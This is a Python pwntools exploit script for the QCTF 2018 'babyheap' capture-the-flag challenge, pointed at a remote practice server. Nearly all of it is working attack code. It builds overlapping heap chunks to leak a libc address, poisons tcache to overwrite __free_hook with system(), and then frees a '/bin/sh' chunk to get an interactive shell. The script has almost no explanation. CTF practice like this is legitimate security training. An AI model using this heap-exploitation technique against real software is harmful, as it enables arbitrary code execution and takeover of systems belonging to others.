# -*- encoding: utf-8 -*-
import sys 
import os 
import requests
from pwn import * 
binary = './QCTF_2018_babyheap'
os.system('chmod +x %s'%binary)
context.binary = binary
context.log_level = 'debug'
elf = ELF(binary)
libc = elf.libc
# libc = ELF('')
DEBUG = 0
if DEBUG:
    libc = elf.libc
    p = process(binary)
    # p = process(['qemu-arm', binary])
    # p = process(['qemu-arm','-g','1234', binary])
    # p = process(['qemu-aarch64','-L','','-g','1234',binary])
else:
    host = 'node4.buuoj.cn'
    port = '29394'
    p = remote(host,port)

l64 = lambda            : ras(u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00')))
l32 = lambda            : ras(u32(p.recvuntil('\xf7')[-4:].ljust(4,'\x00')))
uu64= lambda a          : ras(u64(p.recv(a).ljust(8,'\x00')))
uu32= lambda a          : ras(u32(p.recv(a).ljust(4,'\x00')))
rint= lambda x = 12     : ras(int( p.recv(x) , 16))
sla = lambda a,b        : p.sendlineafter(str(a),str(b))
sa  = lambda a,b        : p.sendafter(str(a),str(b))
lg  = lambda name,data  : p.success(name + ': \033[1;36m 0x%x \033[0m' % data)
se  = lambda payload    : p.send(payload)
rl  = lambda            : p.recv()
sl  = lambda payload    : p.sendline(payload)
ru  = lambda a          : p.recvuntil(str(a))

def ras( data ):
    lg('leak' , data)
    return data

def dbg( b = null):
    if (b == null):
        gdb.attach(p)
        pause()
    else:
        gdb.attach(p,'b %s'%b)

def one_gadget(filename):
    log.success('Leak One_Gadgets...')
    one_ggs = str(subprocess.check_output(['one_gadget','--raw', '-f',filename])).split(' ')
    return list(map(int,one_ggs))

def cmd(num):
    sla(':',num)

def add(size , text='a\n'):
    cmd(1)
    sla('Size:' , size)
    sa('Data:' , text)

def delete( idx ):
    cmd(2)
    sla('Index:' , idx)

def show():
    cmd(3)

# one_gad = one_gadget(libc.path)

def attack():
    
    add( 0x28 )
    add( 0x418 )
    add( 0x28 )
    add( 0x4f8 )
    add( 0x28 )

    delete(2)
    delete(1)
    add(0x28 , flat('\x00'*0x20 , 0x420 + 0x30 )) #1
    delete(3)
    add( 0x418 ) #2

    show()
    __malloc_hook = l64() - 0x70
    libc.address = __malloc_hook - libc.sym['__malloc_hook']
    system_addr = libc.sym['system']
    __free_hook = libc.sym['__free_hook']
    binsh_addr = libc.search('/bin/sh').next()
    lg('__free_hook',__free_hook)

    delete(2)
    add(0x428 , '\x00'*0x418 + p64(0x31) + '\n')
    delete(2)
    delete(0)
    delete(1)
    add(0x428 , '\x00'*0x418 + flat(0x31 , __free_hook - 8) + '\n')
    add(0x28)
    add(0x28 , flat('/bin/sh\x00' , system_addr)+'\n')

    # show()
    delete(2)
    # dbg()
    
    # p.success(getShell())
    p.interactive()

attack()

'''
@File    :   QCTF_2018_babyheap.py
@Time    :   2022/02/06 17:17:34
@Author  :   Niyah 
'''